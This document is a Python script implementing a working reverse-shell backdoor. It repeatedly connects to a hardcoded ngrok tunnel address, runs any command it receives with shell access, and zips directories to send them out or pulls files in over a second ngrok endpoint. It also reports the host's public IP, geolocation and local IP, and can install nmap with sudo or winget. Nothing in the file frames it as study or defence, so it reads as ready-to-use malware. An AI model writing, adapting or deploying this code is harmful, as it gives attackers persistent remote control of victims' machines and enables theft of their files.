import socket
import time
import subprocess
import os
import zipfile
import requests
import platform


ip = '0.tcp.sa.ngrok.io'
port = 15469


def connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"\n[!] Connection received.\n")
            return s
        except socket.error as e:
            print("Connection error:", e)
            time.sleep(10)

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                print("[!] Connection closed by the client.")
                break
            if data[:-1].decode() == "quit":
                s.close()
                break
            else:
                cmd(s, data[:-1].decode())
    except Exception as e:
        print("Error in listen:", e)


def cmd(s, data):
    try:
        if data.startswith("help") or data.startswith("-h"):
            help_text = """\n##########
Manual:
-[help or -h] - Open the manual code;
-[execute] - to execute commands with a message returned for you;
-[cd or Cd] - to change directory;
-[cls or clear] - to clean the terminal;
-[ls or dir] - to list files;
-[info_ip] - to see IP addresses.
-[Download] - Download mode for files from the server(make shure you are using the client.py file to connect on 8887 port);
-[Upload] - to upload files from your computer(make shure you are using the server.py listening on 8889 port and the same address).
-[nmap_install] - Nmap installation for ip addresses scan.
-[quit] - Exit.
##########\n\n"""
            send_data(s, help_text)

        elif data.startswith("execute"):
            command = data.split(" ", 1)[1]
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

        elif data.startswith("cd") or data.startswith("Cd"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Directory changed successfully.\n")
        elif data.startswith("ls"):
            output = subprocess.run("dir",shell=True,check=True, capture_output=True, text=True)
            send_data(s,output.stdout)

        elif data.startswith("Download"):
            server(s)

        elif data.startswith("Upload"):
            client_path(s)

        elif data.startswith("info_ip"):
            obter_informacoes_ip(s)

        elif data.startswith("nmap_installation"):
            install_nmap(s)

        elif data.startswith("cls") or data.startswith("clear"):
            os.system('cls' if os.name == 'nt' else 'clear')

        else:
            output = subprocess.run(data, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

    except Exception as e:
        print("Error in cmd:", e)


def send_data(s, data):
    s.send(data.encode())

def compactar_diretorio(diretorio, arquivo_saida):
    with zipfile.ZipFile(arquivo_saida, 'w') as zipf:
        for raiz, _, arquivos in os.walk(diretorio):
            for arquivo in arquivos:
                caminho_completo = os.path.join(raiz, arquivo)
                relativo = os.path.relpath(caminho_completo, diretorio)
                zipf.write(caminho_completo, relativo)

def client_path(s):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.send(b"\n[!] Trying connection with the server...\n")
        client.connect(('0.tcp.sa.ngrok.io', 12872))
        print('Connected [!]\n')

        s.send(b"\n[!] Connection Received from the server.\n ")
        time.sleep(2)

        s.send(b"Enter the directory to zip> ")
        directory_name = s.recv(1024).decode().strip()
        client.send(directory_name.encode())

        with open('received_directory.zip', 'wb') as file:
            while True:
                data = client.recv(4096)
                if not data:
                    break
                file.write(data)

        s.send(b'\n[+] File received as received_file.zip [ok]\n')
        client.close()
        s.send(b"\n[-] Server closed\n")

    except ConnectionRefusedError as e:
        print("\nConnection error: ", e)
        return
    except Exception as e:
        print("\nConnection error: ", e)
    except KeyboardInterrupt:
        print("\nConnection closed by the client...\n")


def clear_zip():
    zip = "received_directory.zip"
    if os.path.isfile(zip):
        os.remove(zip)

def server(s):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        server.bind(('0.0.0.0', 8887)) #listening on 0.0.0.0 all interfaces.
        server.listen(1)

        s.send(b'\n[!] Waiting for a connection...\n')
        connection, address = server.accept()
        print(f'Connection from {address}')

        s.send(b"\n[!] Connection received! \n")
        diretorio_cliente = connection.recv(1024).decode()

        if not os.path.exists(diretorio_cliente) or not os.path.isdir(diretorio_cliente):
            print(f"Directory '{diretorio_cliente}' does not exist or is not a directory.")
            s.send(b"\n[!] Directory does not exist or is not a directory!\n")
            connection.close()
            server.close()
            s.send(b"\n[-] Server closed\n")
            return
            

        arquivo_zip_saida = 'received_directory.zip'

        compactar_diretorio(diretorio_cliente, arquivo_zip_saida)

        if os.path.getsize(arquivo_zip_saida) == 0:
            print(f"\nFailed to create ZIP file for directory '{diretorio_cliente}'.\n")
            s.send(b"\n[!] Failed to create ZIP file for directory.\n")
            connection.close()
            server.close()
            s.send(b"\n[-] Server closed\n")
            return

        with open(arquivo_zip_saida, 'rb') as file:
            while True:
                data = file.read(4096)  
                if not data:
                    break
                connection.sendall(data) 

        s.send(b'\n[+] ZIP file sent.\n')
        server.close()
        s.send(b"\n[-] Server closed\n")
        clear_zip()
    except Exception as e:
        print("[ERROR] Failure: ",e)
        s.send(b'[ERROR] Failure on the server.\n')

def obter_informacoes_ip(s):
    try:
        resposta = requests.get("https://ipinfo.io")
        if resposta.status_code == 200:
            dados_ip = resposta.json()
            info_string = (
                f"IP Público: {dados_ip['ip']}\n"
                f"Cidade: {dados_ip['city']}\n"
                f"Região: {dados_ip['region']}\n"
                f"País: {dados_ip['country']}\n"
                f"Provedor de Internet: {dados_ip['org']}\n"
            )

            s_local = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_local.connect(("8.8.8.8", 80))  
            ip_local = s_local.getsockname()[0]
            s_local.close()

            send_data(s, info_string) 
            send_data(s, f"IP Local: {ip_local}\n") 

        else:
            print(f"Falha na solicitação: {resposta.status_code}")
            error = "Error in your solicitation.\n"
            send_data(s, error) 

    except Exception as e:
        print(f"Erro ao obter informações do IP: {e}")
        error = "[ERROR] Solicitation error."
        send_data(s, error)


def install_nmap(s):
    system = platform.system()
    command = "where nmap" if system == "Windows" else "which nmap"

    try:
        subprocess.run(command, shell=True, check=True)
        send_data(s, "\n[+] Nmap is already installed.\n")
        return
    except subprocess.CalledProcessError:
        send_data(s, "\n[!] Nmap not found. Starting installation...\n")

    if system == 'Windows':
        send_data(s, "\n[!] Starting Nmap installation on Windows...\n")
        subprocess.run("winget install Insecure.Nmap", shell=True, check=True)
        send_data(s, "\n[!] Nmap and Netcat installation completed.\n")
        
    elif system == "Linux":
        send_data(s, "\n[!] Installing Nmap on Linux...\n")
        subprocess.run("sudo apt install nmap -y", shell=True, check=True)
        send_data(s, "\n[+] Installation completed.\n")
    else:
        send_data(s, "\nThis operating system is not supported.\n")


def main():
    while True:
        try:
            s_connected = connection(ip, port)
            if s_connected:
                listen(s_connected)
            else:
                print("Connection was wrong, trying again.")
        except Exception as e:
            print("Main error: ", e)
            time.sleep(10)


if __name__ == "__main__":
    main()
